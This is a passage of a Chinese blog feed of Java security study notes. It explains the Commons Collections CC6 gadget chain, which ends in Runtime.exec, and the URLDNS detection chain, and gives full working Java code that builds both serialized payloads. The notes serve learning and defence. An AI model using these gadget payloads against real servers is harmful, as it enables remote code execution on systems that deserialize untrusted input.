<p>然后<code>new HashMap</code>作为入口，放入把tiedMapEntry放进key。为什么把tiedMapEntry放进key而不是放进value中？因为<code>HashMap.readObject</code>是对key进行<code>hash()</code>。同样的value随便传。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240525162706680.png" alt="image-20240525162706680"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240525162851644.png" alt="image-20240525162851644"></p>
<p>但是我们在URLDNS那条链里面就有经验了，<code>HashMap.put</code>就会对key进行<code>hash()</code>，也就是对key调用<code>hashCode()</code>，会直接导致在序列化的时候直接走完这条链。</p>
<p>所以得更改一下，改法很多，思路其实都是一样的，put时放进一个不能让链连接起来的对象或者方法，序列化的时候改回设想的调用链，让链能连接起来。</p>
<p>这里主要写了两种方式:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//改法一:先把不把transformers放进chainedTransformer中，这里new了个ConstantTransformer[]&#123;&#125;，ChainedTransformer就调用不了transformers</span></span><br><span class="line"><span class="comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(new ConstantTransformer[]&#123;&#125;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//改法二:先不把chainedTransformer放进LazyMap.decorate()，这样lazyMap也找不到后半条链</span></span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"><span class="comment">//        lazyMap.remove(&quot;aaa&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//改法一：通过反射将transformers放进chainedTransformer中</span></span><br><span class="line"><span class="comment">//        Class&lt;ChainedTransformer&gt; c2 = ChainedTransformer.class;</span></span><br><span class="line"><span class="comment">//        Field iTransformersField = c2.getDeclaredField(&quot;iTransformers&quot;);</span></span><br><span class="line"><span class="comment">//        iTransformersField.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        iTransformersField.set(chainedTransformer, transformers);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//改法二：通过反射将chainedTransformer放进lazyMap中</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(map2);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//本地测试触发</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="遇到一个小问题"><a href="#遇到一个小问题" class="headerlink" title="遇到一个小问题"></a>遇到一个小问题</h3><p>发现这时候反序列化不能成功执行</p>
<p>我们可以尝试调试一下，添加一个lnline Watches，可以看到执行的时候<code>map.put(key，value)</code>把<code>key:&quot;aaa&quot;</code>put进去了，导致我们反序列化得时候<code>if(map.containsKey(key) == false)</code>判定失败，因为这时候<code>if(map.containsKey(key)==true)</code>，然后就走不进这个if，导致调用<code>transform()</code>方法失败，最终导致链不能成功执行。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240525204315232.png" alt="image-20240525204315232"></p>
<p>解决方法很简单，等put完后，<code>remove()</code>掉就行，随后就可以正常执行反序列化</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240525163825585.png" alt="image-20240525163825585"></p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//改法一:先把不把transformers放进chainedTransformer中，这里new了个ConstantTransformer[]&#123;&#125;，ChainedTransformer就调用不了transformers</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//改法二:先不把chainedTransformer放进LazyMap.decorate()，这样lazyMap也找不到后半条链</span></span><br><span class="line"><span class="comment">//        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//改法一：通过反射将transformers放进chainedTransformer中</span></span><br><span class="line">        Class&lt;ChainedTransformer&gt; c2 = ChainedTransformer.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformersField</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformersField.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//改法二：通过反射将chainedTransformer放进lazyMap中</span></span><br><span class="line"><span class="comment">//        Class c = LazyMap.class;</span></span><br><span class="line"><span class="comment">//        Field factoryField = c.getDeclaredField(&quot;factory&quot;);</span></span><br><span class="line"><span class="comment">//        factoryField.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        factoryField.set(lazyMap, chainedTransformer);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(map2);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//本地测试触发</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line"><span class="comment">//        Object o = ois.readObject();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(二)-最好用的CC链</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA反序列化</title>
    <url>/2024/05/21/JAVA%E5%AE%89%E5%85%A8/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="为什么JAVA需要反序列化"><a href="#为什么JAVA需要反序列化" class="headerlink" title="为什么JAVA需要反序列化"></a>为什么JAVA需要反序列化</h2><p><strong>1. 数据持久化</strong></p>
<p>序列化可以将 Java 对象转换为字节序列，并将其存储到文件中或数据库中，该字节包含对象的数据、对象的类型、对象的存储属性。这使得 Java 程序可以很容易地保存和加载数据，而无需每次都重新创建对象。例如，一个 Java 应用程序可以将用户数据序列化到文件中，以便在下次启动时加载。</p>
<p><strong>2. 远程通信</strong></p>
<p>序列化还可以用于在网络上传输 Java 对象。例如，一个 Java 应用程序可以将一个对象序列化并发送给另一个应用程序，或者将一个对象从客户端发送到服务器。这使得 Java 程序可以很容易地在不同的机器之间共享数据。</p>
<h2 id="序列化与反序列化的实现"><a href="#序列化与反序列化的实现" class="headerlink" title="序列化与反序列化的实现"></a>序列化与反序列化的实现</h2><p>序列化对象会通过<code>ObjectOutputStream</code>的<code>writeObject</code>方法将一个对象写入到文件中。</p>
<p>而反序列化是使用了<code>ObjectInputStream类</code>的<code>readObject</code> 方法进行读取并还原成在序列化前的一个类。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>定义了一个Person类，实现了<strong>Serializable</strong>接口，有两个属性和一个构造方法，重写了<code>toString()</code></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521135149134.png" alt="image-20240521135149134"></p>
<p>可以看到<strong>Serializable</strong>是空接口，可以理解为是一个标记，实现了它才能序列。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521135203323.png" alt="image-20240521135203323"></p>
<p>定义了一个serialize静态方法</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521135344209.png" alt="image-20240521135344209"></p>
<p>序列化的结果</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521135254681.png" alt="image-20240521135254681"></p>
<p>反序列化：还原成在序列化前的一个类。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521135403252.png" alt="image-20240521135403252"></p>
<h2 id="为什么会产生安全问题"><a href="#为什么会产生安全问题" class="headerlink" title="为什么会产生安全问题"></a>为什么会产生安全问题</h2><p>只要序列化一个数据，上传到服务器，如果服务器反序列化了，那其中的代码一定会执行，给予了攻击者在服务器执行代码的能力。</p>
<p>或者说传入一个序列化数据，服务器反序列化一定会执行<code>readObject()</code>方法</p>
<h2 id="寻找入口类"><a href="#寻找入口类" class="headerlink" title="寻找入口类"></a>寻找入口类</h2><p>怎么算是一个好的入口类？实现了<code>Serializable</code>接口,重写了readObject，参数类型宽泛，最好JDK自带。</p>
<p>这样我们很容易就会想到Map，HashMap实现了<strong>Serializable</strong>接口，重写了<code>readObject()</code>方法。（在类里面重写了<code>readObject()</code>方法，JDK会自动调用重写的<code>readObject()</code>方法，而不调用原生的<code>readObject()</code>）<img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521141902419.png" alt="image-20240521141902419"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521142108326.png" alt="image-20240521142108326"></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>RULDNS链</title>
    <url>/2024/05/09/JAVA%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/</url>
    <content><![CDATA[<h2 id="URLDNS链优点"><a href="#URLDNS链优点" class="headerlink" title="URLDNS链优点"></a>URLDNS链优点</h2><ol>
<li>使⽤Java内置的类构造，对第三⽅库没有依赖</li>
<li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>
</ol>
<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>ysoserial 中URLDNS链 ， 看这个利用链只涉及两个类<strong>HashMap</strong>和<strong>URL</strong>。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509090622554.png" alt="image-20240509090622554"></p>
<h3 id="HashMap类"><a href="#HashMap类" class="headerlink" title="HashMap类"></a>HashMap类</h3><p><strong>HashMap</strong>自己实现了<code>readObject()</code>。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509093642516.png" alt="image-20240509093642516"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>putVal重新计算了key的hash，跟进<code>hash()</code>（Ctrl+鼠标左键）</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509093734192.png" alt="image-20240509093734192"></p>
<p>代码意思是如果key为null返回0，如果不为null，则调用key的<code>hashCode()</code>。</p>
<p>那我们思考，假如有个a类有<code>hashCode()</code>方法，把a类作为hashMap的key，在这里就相当于调用a类的<code>hashCode()</code>，这就是同名函数调用。</p>
<h3 id="URL类"><a href="#URL类" class="headerlink" title="URL类"></a>URL类</h3><p>承接上文，<strong>URL</strong>类中有<code>hashCode()</code>方法,<code>hashCode()</code>被handler调用，handler 又是 <strong>URLStreamHandler</strong> 的抽象类，我们再去找 <strong>URLStreamHandler</strong> 的 <code>hashCode()</code> 方法。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509102412486.png" alt="image-20240509102412486"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>hashCode()</code>方法传入一个url，<code>getHostAddress(url)</code></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509103443938.png" alt="image-20240509103443938"></p>
<p>进入<code>getHostAddress()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509103838469.png" alt="image-20240509103838469"></p>
<p>这段代码意思是获取给定 URL 对象的主机地址。如果主机地址已经缓存过，则直接返回缓存的地址；否则，尝试解析主机名获取主机地址，并缓存结果。在⽹络上其实就是⼀次 DNS 查询。</p>
<p><strong>流程</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 首先通过HashMap的readObject函数,会调用putVal()函数计算hasHmap的key</span><br><span class="line">1. HashMap -&gt; readObject() -&gt; putVal() -&gt; hash(key) </span><br><span class="line">//hash(Object key)会对key调用hashCode()</span><br><span class="line">2. key.hashCode()</span><br><span class="line">// 如果传入的key 是一个URL对象</span><br><span class="line">3. key = URL url</span><br><span class="line">// 然后会触发URL对象hashcode()</span><br><span class="line">4. url.hashcode()</span><br><span class="line">// 如果hashcode不为-1,就会调用handler的hashcode,并且传入url</span><br><span class="line">5. url.handler.hashcode(url)</span><br><span class="line">// 在handler的hashcode里面会调用getHostAddress,参数是url</span><br><span class="line">6. getHostAddress(url)</span><br><span class="line">// 最后发起一次dns请求</span><br><span class="line">7. dns请求</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p>参考上面的流程，我们需要创建一个hashMap，在hashMap的key传入url对象，看<strong>URL</strong>的构造方法，最简单的构造方法直接放入一个url地址就可以</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509145326944.png" alt="image-20240509145326944"></p>
<p>hashMap不直接直接传参，必须用<code>put()</code>方法，put进去。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509145753562.png" alt="image-20240509145753562"></p>
<p>如果一切顺利的话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 首先通过HashMap的readObject函数,会调用putVal()函数计算hasHmap的key</span><br><span class="line">1. HashMap -&gt; readObject() -&gt; putVal() -&gt; hash(key) </span><br><span class="line">//hash(Object key)会对key调用hashCode()</span><br><span class="line">2. key.hashCode()</span><br><span class="line">// 如果传入的key 是一个URL对象</span><br><span class="line">3. key = URL url</span><br><span class="line">// 然后会触发URL对象hashcode()</span><br><span class="line">4. url.hashcode()</span><br><span class="line">// 如果hashcode不为-1,就会调用handler的hashcode,并且传入url</span><br><span class="line">5. url.handler.hashcode(url)</span><br><span class="line">// 在handler的hashcode里面会调用getHostAddress,参数是url</span><br><span class="line">6. getHostAddress(url)</span><br><span class="line">// 最后发起一次dns请求</span><br><span class="line">7. dns请求</span><br></pre></td></tr></table></figure>

<h3 id="初遇难题"><a href="#初遇难题" class="headerlink" title="初遇难题"></a>初遇难题</h3><p>但是我们发现在序列化的时候就已经触发了</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509150138622.png" alt="image-20240509150138622"></p>
<p>跟进<strong>hashMap</strong>的<code>put()</code>方法，发现在put的时候就已经对key进行一次<code>hash()</code>了，触发了<strong>URL</strong>类的<code>hashCode()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509111302937.png" alt="image-20240509111302937"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509152432465.png" alt="image-20240509152432465"></p>
<p>我们发现，当 <code>hashCode</code> 的值不等于 -1 的时候，函数就会直接 <code>return hashCode</code> 而不执行 <code>hashCode = handler.hashCode(this);</code>。而一开始定义 HashMap 类的时候<code>hashCode</code> 的值为 -1，便是发起了请求。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240509152449960.png" alt="image-20240509152449960"></p>
<h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>思路：在put前，使hashCode不等于-1，put后hashCode等于-1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        </span><br><span class="line">         <span class="comment">//思路</span></span><br><span class="line">        <span class="comment">//HashMap&lt;URL, Object&gt; hashMap = new HashMap&lt;&gt;();</span></span><br><span class="line">        <span class="comment">//将hashCOde值改为不是-1，put()的时候就不会发起请求</span></span><br><span class="line">        <span class="comment">//URL url = new URL(&quot;http://jhc0ym.dnslog.cn&quot;);</span></span><br><span class="line">       </span><br><span class="line">        <span class="comment">//hashMap.put(url, 1);</span></span><br><span class="line">        <span class="comment">//将hashCode值改为-1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Serialization(hashMap);</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//实现</span></span><br><span class="line">        HashMap&lt;URL, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); <span class="comment">//新建一个hashMap</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://jhc0ym.dnslog.cn&quot;</span>);  <span class="comment">//url</span></span><br><span class="line">        </span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">URL</span>&gt; c = url.getClass();  <span class="comment">//获取一个Class</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCodefile</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);  <span class="comment">//获取hashCode字段</span></span><br><span class="line">        hashCodefile.setAccessible(<span class="literal">true</span>);  <span class="comment">//设置字段访问权限</span></span><br><span class="line">        hashCodefile.set(url, <span class="number">123</span>);	 <span class="comment">//将hashCode改为123</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        hashMap.put(url, <span class="number">1</span>);</span><br><span class="line">        hashCodefile.set(url, -<span class="number">1</span>);  <span class="comment">//put完后改为-1</span></span><br><span class="line"><span class="comment">//        Serialization(hashMap);</span></span><br><span class="line">        Deserialization(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialization</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123; <span class="comment">//序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Deserialization</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  <span class="comment">//反序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://juejin.cn/post/6844903954774491144#heading-5">为什么hashMap要实现自己的writeObject和readObject方法</a></p>
<p><a href="https://drun1baby.top/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#%E5%AE%9E%E6%88%98-%E2%80%94%E2%80%94%E2%80%94%E2%80%94-URLDNS">Java反序列化基础篇-01-反序列化概念与利用</a></p>
<p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化漏洞专题-基础篇(21&#x2F;09&#x2F;05更新类加载部分)</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>反射</title>
    <url>/2024/05/16/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习Java的反射机制是为了理解Apache Commons Collections中的反序列化漏洞做准备的。</p>
<h2 id="反射概念"><a href="#反射概念" class="headerlink" title="反射概念"></a>反射概念</h2><p>反射是一种间接操作目标对象的机制，允许程序在运行时获取类的信息，并且在运行时动态地创建对象、调用方法、访问字段等等；<strong>对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的方法&#x2F;访问属性。</strong></p>
<hr>
